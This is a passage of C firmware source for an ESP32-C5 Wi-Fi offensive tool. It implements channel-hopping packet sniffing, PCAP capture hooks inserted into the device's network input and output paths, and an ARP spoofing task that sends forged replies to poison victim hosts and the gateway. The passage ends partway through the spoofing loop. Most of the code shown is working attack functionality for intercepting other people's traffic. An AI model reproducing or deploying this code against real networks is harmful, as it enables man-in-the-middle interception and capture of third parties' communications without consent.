Smethan/projectZero/ESP32C5/main/main.c
        MY_LOG_INFO(TAG, "  [%d] SSID='%s' Ch=%d", i + 1, (char*)scan_ap->ssid, scan_ap->primary);
    }
    
    MY_LOG_INFO(TAG, "Sniffer: %d networks on %d channel(s), total %d APs in database", 
               g_selected_count, sniffer_selected_channels_count, sniffer_ap_count);
    
    // Log channels
    if (sniffer_selected_channels_count > 0) {
        char channel_list[128] = {0};
        int offset = 0;
        for (int i = 0; i < sniffer_selected_channels_count && offset < 120; i++) {
            offset += snprintf(channel_list + offset, sizeof(channel_list) - offset, 
                             "%d%s", sniffer_selected_channels[i], 
                             (i < sniffer_selected_channels_count - 1) ? ", " : "");
        }
        MY_LOG_INFO(TAG, "Channel hopping list: [%s]", channel_list);
    }
}

static void sniffer_channel_hop(void) {
    if (!sniffer_active || sniffer_scan_phase) {
        return;
    }
    
    // Check if we're in selected networks mode
    if (sniffer_selected_mode && sniffer_selected_channels_count > 0) {
        // Use selected channels only
        sniffer_current_channel = sniffer_selected_channels[sniffer_channel_index];
        
        sniffer_channel_index++;
        if (sniffer_channel_index >= sniffer_selected_channels_count) {
            sniffer_channel_index = 0;
        }
    } else {
        // Use dual-band channel hopping (like Marauder)
        sniffer_current_channel = dual_band_channels[sniffer_channel_index];
        
        sniffer_channel_index++;
        if (sniffer_channel_index >= dual_band_channels_count) {
            sniffer_channel_index = 0;
        }
    }
    
    esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Optional: Log channel changes with band info (debug mode)
    #if 0
    const char* band = (sniffer_current_channel <= 14) ? "2.4GHz" : "5GHz";
    MY_LOG_INFO(TAG, "Sniffer: Hopped to channel %d (%s)", sniffer_current_channel, band);
    #endif
}

// Task that handles time-based channel hopping (independent of packet flow)
static void sniffer_channel_task(void *pvParameters) {
    int64_t sniff_oled_last_us = 0;
    
    while (sniffer_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!sniffer_active || sniffer_scan_phase) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            sniffer_channel_hop();
        }
        
        // OLED update (~500ms)
        int64_t now_us = esp_timer_get_time();
        if (now_us - sniff_oled_last_us > 500000) {
            sniff_oled_last_us = now_us;
            char l2[64], l3[64], l4[64];
            snprintf(l2, sizeof(l2), "  Ch %d hopping", sniffer_current_channel);
            snprintf(l3, sizeof(l3), "  AP:%d Probes:%d", sniffer_ap_count, probe_request_count);
            snprintf(l4, sizeof(l4), "  Pkts: %lu", (unsigned long)sniff_oled_packets);
            oled_display_update_full("> Sniffer", l2, l3, l4);
        }
    }
    
    MY_LOG_INFO(TAG, "Sniffer channel task ending");
    vTaskDelete(NULL);
}

// ============================================================================
// PCAP capture functions
// ============================================================================

static void pcap_enqueue_frame(const uint8_t *data, uint16_t len) {
    if (!pcap_capture_active || !pcap_packet_queue || len == 0) return;

    pcap_queued_frame_t *frame = malloc(sizeof(pcap_queued_frame_t) + len);
    if (!frame) return;

    frame->len = len;
    frame->timestamp_us = esp_timer_get_time();
    memcpy(frame->data, data, len);

    if (xQueueSend(pcap_packet_queue, &frame, 0) != pdTRUE) {
        free(frame);
        pcap_capture_drop_count++;
    }
}

static void pcap_radio_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!pcap_capture_active) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len == 0) return;
    pcap_enqueue_frame(pkt->payload, len);
}

static err_t pcap_netif_input_hook(struct pbuf *p, struct netif *inp) {
    if (pcap_capture_active && p && p->tot_len > 0 && p->tot_len <= 1600) {
        uint8_t tmp[1600];
        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
        if (copied > 0) {
            pcap_enqueue_frame(tmp, copied);
        }
    }
    return pcap_original_input(p, inp);
}

static err_t pcap_netif_linkoutput_hook(struct netif *netif, struct pbuf *p) {
    if (pcap_capture_active && p && p->tot_len > 0 && p->tot_len <= 1600) {
        uint8_t tmp[1600];
        uint16_t copied = pbuf_copy_partial(p, tmp, p->tot_len, 0);
        if (copied > 0) {
            pcap_enqueue_frame(tmp, copied);
        }
    }
    return pcap_original_linkoutput(netif, p);
}

static void pcap_writer_task(void *param) {
    (void)param;
    uint32_t flush_counter = 0;
    pcap_queued_frame_t *frame = NULL;

    MY_LOG_INFO(TAG, "PCAP writer task started");

    while (pcap_capture_active) {
        if (xQueueReceive(pcap_packet_queue, &frame, pdMS_TO_TICKS(200)) == pdTRUE) {
            pcap_record_header_t rec = {
                .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
                .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
                .incl_len = frame->len,
                .orig_len = frame->len
            };
            fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
            fwrite(frame->data, 1, frame->len, pcap_capture_file);
            free(frame);
            pcap_capture_frame_count++;
            flush_counter++;
            if (flush_counter >= 50) {
                fflush(pcap_capture_file);
                flush_counter = 0;
            }
        }
    }

    while (xQueueReceive(pcap_packet_queue, &frame, 0) == pdTRUE) {
        pcap_record_header_t rec = {
            .ts_sec  = (uint32_t)(frame->timestamp_us / 1000000),
            .ts_usec = (uint32_t)(frame->timestamp_us % 1000000),
            .incl_len = frame->len,
            .orig_len = frame->len
        };
        fwrite(&rec, 1, sizeof(rec), pcap_capture_file);
        fwrite(frame->data, 1, frame->len, pcap_capture_file);
        free(frame);
        pcap_capture_frame_count++;
    }

    fflush(pcap_capture_file);
    fclose(pcap_capture_file);
    pcap_capture_file = NULL;
    sd_sync();

    MY_LOG_INFO(TAG, "PCAP writer done: %s (%lu frames, %lu drops)",
                pcap_capture_filepath,
                (unsigned long)pcap_capture_frame_count,
                (unsigned long)pcap_capture_drop_count);

    pcap_writer_task_handle = NULL;
    vTaskDelete(NULL);
}

static void pcap_arp_spoof_task(void *param) {
    (void)param;

    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "ARP spoof: STA netif not found");
        pcap_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta_netif);
    if (!lwip_nif || !lwip_nif->linkoutput) {
        MY_LOG_INFO(TAG, "ARP spoof: lwIP netif or linkoutput not available");
        pcap_arp_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    MY_LOG_INFO(TAG, "ARP spoof: Poisoning %d hosts + gateway", pcap_arp_host_count);
    uint32_t round = 0;

    while (pcap_arp_active) {
        for (int i = 0; i < pcap_arp_host_count && pcap_arp_active; i++) {
            send_arp_reply(lwip_nif,
                           pcap_arp_hosts[i].mac,   // Eth dst: victim
                           pcap_arp_own_mac,         // Eth src: our MAC
                           pcap_arp_own_mac,         // ARP sender MAC: our MAC
                           pcap_arp_gateway_ip,      // ARP sender IP: gateway (spoofed)
                           pcap_arp_hosts[i].mac,    // ARP target MAC: victim
                           pcap_arp_hosts[i].ip);    // ARP target IP: victim

